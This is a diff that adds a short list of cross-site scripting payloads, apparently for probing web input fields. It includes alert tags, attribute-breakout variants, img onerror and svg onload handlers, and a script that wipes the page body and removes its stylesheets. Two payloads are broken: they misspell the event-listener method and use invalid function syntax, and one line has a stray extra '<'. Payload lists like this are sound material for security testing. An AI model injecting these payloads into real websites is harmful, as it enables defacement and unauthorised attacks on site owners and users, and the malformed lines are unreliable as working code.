@@ -1,0 +1,10 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<script>document.body.innerHTML = ''; document.querySelectorAll('style, link[rel="stylesheet"], script').forEach(el => el.remove());</script>
+"><script>document.body.innerHTML = ''; document.querySelectorAll('style, link[rel="stylesheet"], script').forEach(el => el.remove());</script>
+<script>document.addEventListenet("click", function () => { alert(1) })</script>
+"><script>document.addEventListenet("click", function () => { alert(1) })</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<svg/onload=alert('hacked')>
+"><<svg/onload=alert('hacked')>
